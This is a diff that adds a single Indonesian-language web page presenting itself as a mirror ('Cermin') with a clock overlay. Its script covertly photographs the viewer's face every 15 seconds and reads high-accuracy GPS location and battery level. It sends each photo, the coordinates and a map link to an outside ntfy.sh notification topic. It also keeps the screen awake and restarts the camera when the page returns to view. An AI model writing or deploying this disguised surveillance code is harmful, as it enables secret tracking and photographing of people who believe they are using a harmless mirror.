@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<title>Cermin</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;height:100%;background:#000;color:#fff;overflow:hidden;
+  font:14px/1.4 -apple-system,system-ui,sans-serif;-webkit-user-select:none}
+#v{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+#hud{position:fixed;left:0;right:0;bottom:0;padding:18px 20px 28px;
+  background:linear-gradient(transparent,rgba(0,0,0,.8));
+  display:flex;justify-content:space-between;align-items:flex-end}
+#jam{font-size:38px;font-weight:200;letter-spacing:1px}
+#st{font-size:10px;color:#9a9aae;text-align:right;max-width:55%;line-height:1.6}
+#badge{position:fixed;top:16px;left:50%;transform:translateX(-50%);
+  background:rgba(0,0,0,.6);padding:6px 14px;border-radius:999px;font-size:11px;color:#a0a0b8;
+  backdrop-filter:blur(8px)}
+.dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:#ef4444;
+  margin-right:7px;vertical-align:middle;animation:p 1.6s infinite}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.25}}
+</style>
+</head>
+<body>
+<video id="v" autoplay playsinline muted></video>
+<div id="badge"><span class="dot"></span><span id="b">menyiapkan</span></div>
+<div id="hud"><div id="jam">--:--</div><div id="st"></div></div>
+<canvas id="c" hidden></canvas>
+<script>
+var NTFY     = "https://ntfy.sh/GANTI_TOPIC";
+var INTERVAL = 15000;
+var QUALITY  = 0.6;
+var MAXW     = 480;
+
+var video=document.getElementById('v'), c=document.getElementById('c');
+var st=document.getElementById('st'), bd=document.getElementById('b');
+var stream=null, lat=null, lon=null, acc=null, bat=null, wl=null;
+
+function log(t){ st.textContent=t; }
+function badge(t){ bd.textContent=t; }
+
+setInterval(function(){
+  var d=new Date();
+  document.getElementById('jam').textContent=
+    ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
+},1000);
+
+document.body.addEventListener('click',function(){
+  if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+});
+
+function awake(){
+  try{ if('wakeLock' in navigator) navigator.wakeLock.request('screen').then(function(l){wl=l}); }catch(_){}
+}
+
+if(navigator.getBattery){ navigator.getBattery().then(function(x){
+  bat=Math.round(x.level*100);
+  x.addEventListener('levelchange',function(){ bat=Math.round(x.level*100); });
+}); }
+
+function kamera(){
+  return navigator.mediaDevices.getUserMedia({
+    video:{facingMode:'user',width:{ideal:640},height:{ideal:480}}, audio:false
+  }).then(function(s){
+    stream=s; video.srcObject=s;
+    var p=video.play(); if(p&&p.catch) p.catch(function(){});
+    badge('kamera aktif');
+  });
+}
+
+function gps(){
+  if(!navigator.geolocation) return;
+  navigator.geolocation.watchPosition(function(p){
+    lat=p.coords.latitude; lon=p.coords.longitude; acc=Math.round(p.coords.accuracy);
+    badge('kamera aktif \u2022 lokasi terkunci');
+  },function(){}, {enableHighAccuracy:true, maximumAge:5000, timeout:20000});
+}
+
+function potret(){
+  if(!stream || !video.videoWidth) return;
+  var w=video.videoWidth, h=video.videoHeight, k=Math.min(1,MAXW/w);
+  c.width=Math.round(w*k); c.height=Math.round(h*k);
+  c.getContext('2d').drawImage(video,0,0,c.width,c.height);
+
+  c.toBlob(function(blob){
+    if(!blob) return;
+    var d=new Date();
+    var jam=('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2)+':'+('0'+d.getSeconds()).slice(-2);
+    var isi=[];
+    if(lat!==null){
+      isi.push(lat.toFixed(6)+','+lon.toFixed(6)+' +-'+acc+'m');
+      isi.push('https://maps.google.com/?q='+lat+','+lon);
+    } else { isi.push('lokasi: menunggu izin'); }
+    isi.push('baterai: '+(bat!==null?bat+'%':'?'));
+
+    fetch(NTFY,{
+      method:'POST', body:blob,
+      headers:{
+        'Filename':'wajah-'+d.getTime()+'.jpg',
+        'Title':'Wajah '+jam,
+        'Message':isi.join('  |  '),
+        'Content-Type':'image/jpeg',
+        'Priority':'3'
+      }
+    }).then(function(){ log('terkirim '+jam); })
+      .catch(function(){ log('gagal kirim '+jam); });
+  },'image/jpeg',QUALITY);
+}
+
+function loop(){ potret(); setTimeout(loop, INTERVAL); }
+
+function bangun(){
+  if(!stream || stream.getVideoTracks()[0].readyState==='ended'){
+    kamera().catch(function(){ badge('kamera ditolak'); });
+  } else { var p=video.play(); if(p&&p.catch) p.catch(function(){}); }
+}
+
+document.addEventListener('visibilitychange',function(){
+  if(document.visibilityState==='visible'){ awake(); bangun(); }
+});
+
+kamera().then(function(){
+  gps(); awake();
+  badge('kamera aktif');
+  setTimeout(function(){ loop(); }, 3000);
+}).catch(function(e){
+  badge('kamera ditolak');
+  log(e.message);
+});
+</script>
+</body>
+</html>
